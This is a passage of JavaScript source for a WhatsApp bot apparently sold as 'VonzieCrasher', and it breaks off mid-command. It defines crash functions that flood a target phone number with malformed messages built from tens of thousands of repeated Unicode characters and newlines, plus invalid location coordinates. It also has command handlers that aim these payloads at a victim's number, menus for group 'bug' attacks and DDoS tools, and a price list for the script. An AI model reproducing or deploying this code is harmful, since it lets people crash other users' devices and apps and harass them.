  console.log(chalk.redBright(`[BULLDOZER] (${target}) ATTACKING`));
}

async function ForceSpamSafe(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: ' 🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥 🩸 ' + " \u2003".repeat(30000) + " ꦾ".repeat(2000)
          },
          footer: {
            text: ' 🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥 🩸 ' + " \u2003".repeat(30000) + " ꦾ".repeat(2000)
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: '@ ᔫ 𖣂 𝐃𝐀𝐍𝐆𝐄𝐑 𝐈𝐍𝐅𝐈𝐓𝐘 𖣂 ᔮ🩸' + " ꦾ".repeat(2000), 
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: "@ ᔫ 𖣂 𝐃𝐀𝐍𝐆𝐄𝐑 𝐈𝐍𝐅𝐈𝐓𝐘 𖣂 ᔮ🩸" + " ꦾ".repeat(2000), 
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000)
                }
              }
            ]
          }
        }
      }
    }
  }, {});

  // Kirim pesan
  await ryu.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  // Tunggu sebentar biar terkirim
  await sleep(1500);

  // Delete hanya pesan ini, gak sentuh fungsi lain
  await ryu.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: msg.key.id,
      participant: '0@s.whatsapp.net'
    }
  });

  console.log(chalk.green(`✅ Attack Group To ${target}`));
}

async function frezios(target) {
      let frezios = "𑇂𑆵𑆴𑆿".repeat(60000);
      await ryu.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: frezeios,
            url: "Ai",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

switch (command) {

case 'menu':{
let anj = `
こんにちは、Vonzie Crasher スクリプト ユーザーの皆さん。開発者として、これを良いことに使用していただければとても嬉しいです。
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏
`
const buttons = [
  {
    buttonId: ".buysc",
    buttonText: {
      displayText: "🌸"
    },
   }, {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨"
    }
  }
]

const buttonMessage = {
    document: fs.readFileSync("./logo.jpg"),
    mimetype: "image/png",
    fileName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
    jpegThumbnail: tdxlol,
    fileLength: 999999999999999,
    pageCount: 99999,
    caption: anj,
    footer: '© 𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟',
    buttons: buttons,
    headerType: 9,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `hi ${pushname}`, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "ade",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'JPG', 
        previewType: 'JPG', 
        sourceUrl: "https://t.me/RyuAj", 
        thumbnailUrl: "https://files.catbox.moe/6y35hh.jpg", 
        title: 'Bot WhatsApp',
      },
    },
    viewOnce: true,
    headerType: 6
  };
  
  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝐏𝐢𝐥𝐢𝐡 𝐌𝐞𝐧𝐮",
                    sections: [
                        {
                            title: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            highlight_label: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            rows: [
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: "ShowAllMenuBug",
                                    description: "War Mode",
                                    id: ".warmode"
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowMenuOwner",
                                    description: "Menampilkan Owner Menu",
                                    id: ".ownerryu"    
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowBugMenu",
                                    description: "Mode Bug",
                                    id: ".bugmenu"    
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await ryu.sendMessage(m.chat, buttonMessage, { quoted: m });
  };
break;
case "vonzie-button": {
if (!isAccryuDev) return ryu("Fitur Khusus User Premium");
if (!q) return ryuReply(`*Example : ${command} 62xxx*`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
    const captionText = `
𝐓𝐚𝐫𝐠𝐞𝐭 : *${pepec}* 
𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐥𝐞𝐜𝐭 𝐁𝐮𝐭𝐭𝐨𝐧 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 :
`;

      const buttonMessage = {
    document: fs.readFileSync("./logo.jpg"),
    mimetype: "image/png",
    fileName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
    jpegThumbnail: tdxlol,
    fileLength: 999999999999999,
    pageCount: 99999,
    footer: '© 𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟',
    buttons: buttons,
    headerType: 9,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `hi ${pushname}`, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "ade",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'JPG', 
        previewType: 'JPG', 
        sourceUrl: "https://t.me/RyuAj", 
        thumbnailUrl: "https://files.catbox.moe/6y35hh.jpg", 
        title: 'Bot WhatsApp',
      },
    },
    viewOnce: true,
    headerType: 6
  };

  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝐏𝐢𝐥𝐢𝐡 𝐌𝐞𝐧𝐮",
                    sections: [
                        {
                            title: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            highlight_label: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            rows: [
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: "ShowAllMenuBug",
                                    description: "War Mode",
                                    id: ".warmode"
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowMenuOwner",
                                    description: "Menampilkan Owner Menu",
                                    id: ".ownerryu"    
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowBugMenu",
                                    description: "Mode Bug",
                                    id: ".bugmenu"    
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];
    
    buttonMessage.buttons.push(...flowActions);

return await ryu.sendMessage(m.chat, buttonMessage, { quoted: m });
  };
break;
case 'bugmenu':{
let bug = `
( 👋🏻 ) - Hello  ${m.pushName} ,
こんにちは、Vonzie Crasher スクリプト ユーザーの皆さん。開発者として、これを良いことに使用していただければとても嬉しいです。
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏
͏͏͏͏͏
計さ *BUG MENU*
 ⌬ Fcinvis 628xxxx
 ⌬ Xvsblank 628xxxx
 ⌬ SystemVcx 628xxxx
 ⌬ XdelayVcx 628xxxx
 ⌬ Frezios 628xxxx
 ⌬ vonzie-button 628xxxx

*計さ BUG 𝐆𝐑𝐎𝐔𝐏*
 ⌬ Blankgc InplaceGc
 ⌬ Delaygc InplaceGc
 ⌬ XvcZ InplaceGc
 
 計さ MT BANED*
 ⌬ mt-banedv1 ryu
 ⌬ mt-banedv2 ryu
 ⌬ mt-banedv3 𝑟𝑦𝑢
 
> © 2025 - *RyuMa Official*
`
const buttons = [
  {
    buttonId: ".buysc",
    buttonText: {
      displayText: "🌸"
    },
   }, {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨"
    }
  }
]

const buttonMessage = {
    document: fs.readFileSync("./logo.jpg"),
    mimetype: "image/png",
    fileName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
    jpegThumbnail: tdxlol,
    fileLength: 999999999999999,
    pageCount: 99999,
    caption: bug,
    footer: '© 𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟',
    buttons: buttons,
    headerType: 9,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `hi ${pushname}`, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "ade",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'JPG', 
        previewType: 'JPG', 
        sourceUrl: "https://t.me/RyuAj", 
        thumbnailUrl: "https://files.catbox.moe/6y35hh.jpg", 
        title: 'Bot WhatsApp',
      },
    },
    viewOnce: true,
    headerType: 6
  };

  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝐏𝐢𝐥𝐢𝐡 𝐌𝐞𝐧𝐮",
                    sections: [
                        {
                            title: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            highlight_label: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            rows: [
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: "ShowAllMenuBug",
                                    description: "War Mode",
                                    id: ".warmode"
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowMenuOwner",
                                    description: "Menampilkan Owner Menu",
                                    id: ".ownerryu"    
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowBugMenu",
                                    description: "Mode Bug",
                                    id: ".bugmenu"    
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await ryu.sendMessage(m.chat, buttonMessage, { quoted: m });
  };
break;
case 'ownerryu':{
let ahh = `
こんにちは、Vonzie Crasher スクリプト ユーザーの皆さん。開発者として、これを良いことに使用していただければとても嬉しいです。
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏

\`[ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ]\`
▢ .addowner
▢ .delowner [ Number ]
▢ .addprem [ Number ]
▢ .delprem [ Number ]
▢ .self  [ Mode Privat ]
▢ .public  [ Mode Public ]
`
const buttons = [
  {
    buttonId: ".buysc",
    buttonText: {
      displayText: "🌸"
    },
   }, {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨"
    }
  }
]

const buttonMessage = {
    document: fs.readFileSync("./logo.jpg"),
    mimetype: "image/png",
    fileName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
    jpegThumbnail: tdxlol,
    fileLength: 999999999999999,
    pageCount: 99999,
    caption: ahh,
    footer: '© 𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟',
    buttons: buttons,
    headerType: 9,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `hi ${pushname}`, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "ade",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'JPG', 
        previewType: 'JPG', 
        sourceUrl: "https://t.me/RyuAj", 
        thumbnailUrl: "https://files.catbox.moe/6y35hh.jpg", 
        title: 'Bot WhatsApp',
      },
    },
    viewOnce: true,
    headerType: 6
  };

  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝐏𝐢𝐥𝐢𝐡 𝐌𝐞𝐧𝐮",
                    sections: [
                        {
                            title: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            highlight_label: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            rows: [
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: "ShowAllMenuBug",
                                    description: "War Mode",
                                    id: ".warmode"
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowMenuOwner",
                                    description: "Menampilkan Owner Menu",
                                    id: ".ownerryu"    
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowBugMenu",
                                    description: "Mode Bug",
                                    id: ".bugmenu"    
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await ryu.sendMessage(m.chat, buttonMessage, { quoted: m });
  };
break;

case "tqto": {
let msgbug = `\`[ 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 ]\`
ryuOffc [ Creator ]
Family [ Support ]
AllahSwt [ My God ]
All Pengguna Script
`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                newsletterName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟"
            }
        },
        footer: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await ryu.sendMessage(m.chat, buttonMessage, { quoted: ftoko });

await ryu.sendMessage(m.chat, {audio: fs.readFileSync('./sound/ryu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;

case "buysc": {
let msgbug = `[ 🇯🇵 ] Pricelist Script\`
このボットは、ユーザーがさまざまなアクティビティを実行できるようにするために開発されました。このボットには攻撃機能も備わっているため、賢く使用してください。
Warm Creatings: િ𝐑𝐲𝐮𝐌𝐚 𝐀𝐣𝐚

*𝐒𝐚𝐥𝐞 𝐒𝐜𝐫𝐢𝐩𝐭 𝐕𝐨𝐧𝐳𝐢𝐞 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟏*
──────────────────────
 *PriceList Scripts*
━⬤ Rp 30.000 ( No update )
━⬤ Rp 55.000 ( Free update )

*Pricelist Reseler & Owner*
━⬤ Rp 60.000 ( Free update Permanen )
━⬤ Rp 80.000 ( Free update Permanen )

*Pricelist Partner & Tangan Kanan*
━⬤ Rp 100.000 ( Free No Enc )
━⬤ Rp 200.000 ( Free Full No Enc )
Social Media Creators:
━⬤ Telegram : t.me/RyuMa.
━⬤ Whatsapp : wa.me/62857734669112
`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                newsletterName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟"
            }
        },
        footer: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await ryu.sendMessage(m.chat, buttonMessage, { quoted: ftoko });

await ryu.sendMessage(m.chat, {audio: fs.readFileSync('./sound/ryu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;

case "toolsddos": {
let msgbug = `\` *『 _Ryzzz✗eight Botz_ 』*\`

\`╭┈┈┈••✦ RyuMa ✦••┈┈┈•\`
\`╎⎋Creator : Ryzzz✗eight\`
\`╰┈┈┈┈┈┈┈┈┈┈┈┈••\`
╭┈┈┈••✦ RyuMa ✦••┈┈┈•
╎➠  ddos
╎➠  dos
╎➠  mix
╎➠  floods
╎➠  ua
╎➠  xhcrome
╎➠  tls
╎➠  tlsbypass
╎➠  tlsv2
╎➠  bypass-cf
╎➠  tls-vip
╎➠  xc
╰┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈••
`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        gifPlayback: true,
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                newsletterName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟"
            }
        },
        footer: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await ryu.sendMessage(m.chat, buttonMessage, { quoted: ftoko });

await ryu.sendMessage(m.chat, {audio: fs.readFileSync('./sound/ryu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;
            
case "public": { 
if (!isAccryuDev) return ryuReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
ryu.public = true
ryuReply(`*\`Succes Beralih mode ke mode public\`*`)
}
break
case "self": { 
if (!isAccryuDev) return ryuReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
ryu.public = false
ryuReply(`*\`Succes Beralih mode ke mode self\`*`)
}
break

case "addowner":{
if (!isAccryuDev) return ryuReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return ryuReply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ryu.onWhatsApp(prrkek)
if (ceknya.length == 0) return ryuReply(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
ownerbot.push(prrkek)
fs.writeFileSync("./all/Database/owner.json", JSON.stringify(ownerbot))
ryuReply(`*\`Nomor ${prrkek} Telah Menjadi Owner!\`*`)
}
break

case "delowner":{
if (!isAccryuDev) return ryuReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return ryuReply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(ya)
ownerbot.splice(unp, 1)
fs.writeFileSync("./all/Database/owner.json", JSON.stringify(ownerbot))
ryuReply(`*\`Nomor ${ya} Telah Di Hapus Owner!\`*`)
}    
break

case "addprem":{
if (!isAccryuDev && !isCreator) return ryuReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return ryuReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ryu.onWhatsApp(prrkek)
if (ceknya.length == 0) return ryuReply(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
ownerbot.push(prrkek)
fs.writeFileSync("./all/Database/owner.json", JSON.stringify(ownerbot))
ryuReply(`*\`Nomor ${prrkek} Telah Menjadi Premium!\`*`)
}
break


case "delprem":{
if (!isAccryuDev && !isCreator) return ryuReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
if (!args[0]) return ryuReply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(ya)
ownerbot.splice(unp, 1)
fs.writeFileSync("./all/Database/owner.json", JSON.stringify(ownerbot))
ryuReply(`*\`Nomor ${ya} Telah Di Hapus Premium!\`*`)
}    
break

//BATAS CASE BUG//
case "clearbug":
        {
          if (!isAccryuDev) return ryuReply("𝗙𝗶𝘁𝘂𝗿 𝗞𝗵𝘂𝘀𝘂𝘀 𝙊𝙬𝙣𝙚𝙧!!");
          if (!q) return ryuReply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return ryuReply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 3; i++) {
            await ryu.sendMessage(target, {
              text: "𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂",
            });
          }
          ryuReply("*\`𝘿𝙊𝙉𝙀 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂!\`*");
        }
        break;


case 'fcinvis': case 'vonziecrash': {
    // Tambahkan pengecekan akses
    const isAuthorized = isAccryuDev || sender === botNumber;
    if (!isAccryuDev) 
        return ryuReply('`Fitur Khusus User Premium`');
    
    if (!q) 
        return ryuReply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return ryuReply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
